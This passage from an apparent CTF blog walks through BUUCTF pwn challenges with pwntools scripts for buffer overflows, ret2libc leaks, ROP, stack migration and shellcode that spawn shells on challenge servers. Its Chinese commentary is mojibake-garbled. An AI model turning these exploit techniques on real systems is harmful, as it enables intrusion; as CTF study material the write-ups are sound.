class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/47&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26608</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x04</span>) + p32(win_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xDEADC0DE</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter your string: \n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2e-cmcc-simplerop"><a href="#0x2e-cmcc-simplerop" class="headerlink" title="0x2e.cmcc_simplerop"></a>0x2e.cmcc_simplerop</h2><p><code>ret2syscall &amp; mprotect &amp; é™æ€é“¾æ¥</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/48&quot;</span>)</span><br><span class="line"><span class="comment"># c =remote(&#x27;node4.buuoj.cn&#x27;,28081)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x0806D870</span></span><br><span class="line">start_addr = <span class="number">0x80e9000</span> </span><br><span class="line">main_addr = <span class="number">0x08048E24</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Your input :&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span>) + p32(mprotect_addr) + p32(main_addr) + p32(start_addr) + p32(<span class="number">0x1000</span>) + p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Your input :&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x18</span>) + p32(read_addr) + p32(start_addr) + p32(<span class="number">0</span>) + p32(start_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># gdb.attach(c)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------<span class="comment">#syscall</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret =<span class="number">0x0806e850</span></span><br><span class="line">int80 = <span class="number">0x080493e1</span></span><br><span class="line">read_addr= <span class="number">0x0806CD50</span></span><br><span class="line">bss_addr = <span class="number">0x080EB584</span></span><br><span class="line">main_addr = <span class="number">0x08048E24</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(read_addr) +p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(int80) </span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­ç¬¬äºŒä¸ªpayloadåç§»å‘ç”Ÿäº†å˜åŒ–ã€‚</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.5k0e6b9mxh8g.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.412xvqxjvmkg.webp"></p><p>â€‹    ç»è¿‡åŠ¨è°ƒï¼Œç¬¬äºŒæ¬¡çš„æº¢å‡ºåç§»ä¸º<code>0x18</code></p><h2 id="0x2f-bbys-tu-2016"><a href="#0x2f-bbys-tu-2016" class="headerlink" title="0x2f.bbys_tu_2016"></a>0x2f.bbys_tu_2016</h2><p><code>ret2text &amp; padding</code></p><p>â€‹    idaä¸­çš„åœ°å€ä¸å‡†ç¡®ï¼Œä½¿ç”¨äº†<code>cyclic</code>è®¡ç®—åç§»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27706</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">print_flag = <span class="number">0x0804856D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">24</span>) + p32(print_flag)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x30-xdctf2015-pwn200"><a href="#0x30-xdctf2015-pwn200" class="headerlink" title="0x30.xdctf2015_pwn200"></a>0x30.xdctf2015_pwn200</h2><p><code>ret2libc3 -x86</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/50&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25787</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/50&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc32.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(c.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh) </span><br><span class="line"><span class="comment"># c.recvuntil(b&#x27;Welcome to XDCTF2015~!\n&#x27;)  # ç¬¬äºŒæ¬¡ä¸ä¼šæ‰“å°è¿™æ¡ä¿¡æ¯ï¼Œå› ä¸ºbufå·²ç»è¢«æ›´æ”¹äº†</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x31-wustctf2020-getshell-2"><a href="#0x31-wustctf2020-getshell-2" class="headerlink" title="0x31.wustctf2020_getshell_2"></a>0x31.wustctf2020_getshell_2</h2><p><code>ret2libc1 &amp; call between plt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/51&quot;</span>)</span><br><span class="line"><span class="comment"># c =remote(&#x27;node4.buuoj.cn&#x27;,25355)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/51&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">system_call = <span class="number">0x08048529</span></span><br><span class="line">system_plt = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = <span class="number">0x08048670</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(c)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1c</span> + p32(system_call) + p32(sh)</span><br><span class="line"><span class="comment"># payload = b&#x27;b&#x27;*0x1c + p32(system_plt) + p32(sh)</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>ä½†æ˜¯æ²¡æ³•åˆ©ç”¨<code>system@plt</code>åœ°å€ï¼Œå› ä¸ºpltåœ°å€éœ€è¦è¿”å›å€¼ï¼Œå¯æº¢å‡ºçš„åœ°å€ä½æ•°ä¸å¤Ÿ<code>0x24-0x18=0xc</code>ï¼Œæ‰€ä»¥åªèƒ½ç”¨<code>shell()</code>é‡Œçš„<code>call system</code>æ¥è°ƒç”¨systemï¼Œcallå‡½æ•°ä¸ç”¨è¿”å›å€¼äº†ï¼Œå®ƒä¼šè‡ªå·±æŠŠä¸‹ä¸€æ¡æŒ‡ä»¤ç»™å‹è¿›å»ã€‚</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.4eu7ap6bmn8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.6m2td8llggw0.webp"></p><h2 id="0x32-mrctf2020-easyoverflow"><a href="#0x32-mrctf2020-easyoverflow" class="headerlink" title="0x32.mrctf2020_easyoverflow"></a>0x32.mrctf2020_easyoverflow</h2><p><code>interesting overflow</code></p><p>â€‹    ä¸€å¼€å§‹æˆ‘çš„æ€è·¯é”™äº†ï¼Œæˆ‘å¼€å§‹åœ¨ç¨‹åºé‡Œé¢å»æ‰¾å­˜æ”¾<code>fake_flag</code>çš„å€¼<code>n0t_r3@11y_f1@g</code>çš„åœ°å€ï¼Œæ‰¾åˆ°äº†åœ¨dataæ®µçš„<code>0x944</code>ä½†æ˜¯ä¼ å…¥åå´å¾—åˆ°çš„å‚æ•°ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œåœ¨å€Ÿé‰´å…¶ä»–payloadä¹‹åæ‰å‘ç°æˆ‘ä»¬åŸæ¥æ˜¯å¯ä»¥ç›´æ¥è¦†å†™çš„ï¼ŒæŒºæœ‰æ„æ€æ¶¨çŸ¥è¯†äº†ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26912</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">b&#x27;n0t_r3@11y_f1@g&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + real_flag</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.15tq7l71waw0.webp"></p><h2 id="0x33-ZJCTF-2019-Login"><a href="#0x33-ZJCTF-2019-Login" class="headerlink" title="0x33.[ZJCTF 2019]Login"></a>0x33.[ZJCTF 2019]Login</h2><p><code>ret2eax</code></p><p>â€‹    ä¿æŠ¤å…¨å¼€ï¼Œéº»äººçš„C++ä¼ªä»£ç ï¼ŒROPæ–°çŸ¥è¯†ç‚¹<code>ret2eax</code></p><p>â€‹    åˆ©ç”¨<code>\x00</code>æˆªæ–­<code>strcmpå‡½æ•°</code>ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆåé¢å­—ç¬¦å¡«å……çš„æ—¶å€™ä¹Ÿåªæœ‰ç”¨<code>\x00</code>å¡«å……æ‰èƒ½æ‰“å¾—é€šï¼Œä¼°è®¡æ˜¯æ¶‰åŠåˆ°æŸäº›å­—ç¬¦ä¸²å‡½æ•°äº†å§ï¼Ÿæ€»ä¹‹è¿™é“é¢˜ä¹Ÿè®©æˆ‘æ¶¨çŸ¥è¯†å¾ˆå¤šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26019</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0400E88</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter username: &#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter password: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0x18</span>-<span class="built_in">len</span>(<span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span>))+ p64(backdoor)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x34-ciscn-2019-s-4"><a href="#0x34-ciscn-2019-s-4" class="headerlink" title="0x34.ciscn_2019_s_4"></a>0x34.ciscn_2019_s_4</h2><p><code>Stack Migration x86</code></p><p>â€‹    è¿™é“é¢˜å’Œå‰é¢çš„é‚£é“ä¸€æ ·ï¼Œä½†æ˜¯ç†è§£æ›´æ·±å…¥æ›´å®¹æ˜“äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26335</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/54&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = u32(c.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># leak real ebp</span></span><br><span class="line">log.success(<span class="string">&#x27;The Real EBP :&#x27;</span> + <span class="built_in">hex</span>(ebp))</span><br><span class="line">buf_addr = ebp - <span class="number">0x38</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment"># Added stack</span></span><br><span class="line">payload = p32(sys_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf_addr+ <span class="number">4</span>*<span class="number">3</span>) + <span class="string">b&quot;sh&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># rest paddings + ebp + eip</span></span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;\0&#x27;</span> + p32(buf_addr-<span class="number">4</span>) + p32(leave_ret) </span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><mark>éš¾ç‚¹ï¼š</mark></p><ol><li><code>padding = 0x38</code></li></ol><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.16kidbyf9oxs.webp"></p><ol start="2"><li><code>buf_addr+ 4*3</code> : <code>system</code> çš„å‚æ•°æŒ‡å‘<code>sh</code>çš„åœ°å€ï¼Œä»è€Œ<code>system(&#39;/bin/sh&#39;)</code></li></ol><h2 id="0x35-jarvisoj-level1"><a href="#0x35-jarvisoj-level1" class="headerlink" title="0x35.jarvisoj_level1"></a>0x35.jarvisoj_level1</h2><p><code>ret2shellcode &amp; ret2libc3</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.6uq99m19va4g.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/55&quot;</span>)</span><br><span class="line"><span class="comment"># c =remote(&#x27;node4.buuoj.cn&#x27;,25119)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/55&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;:0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(c.recvline()[<span class="number">0</span>:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = shellcode + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8c</span>-<span class="built_in">len</span>(shellcode)) + p32(buf_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    å› ä¸ºå¹³å°å¹¶ä¸æ˜¯å…ˆå‘é€çš„<code>buf</code>åœ°å€ï¼Œæ•…è¿™ç§æ–¹æ³•åªèƒ½åœ¨æœ¬åœ°æ‰“é€šã€‚é‚£ä¹ˆç›´æ¥ä½¿ç”¨<code>ret2libc3</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/55&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25119</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/55&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc32.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">140</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">140</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x36-wustctf2020-closed"><a href="#0x36-wustctf2020-closed" class="headerlink" 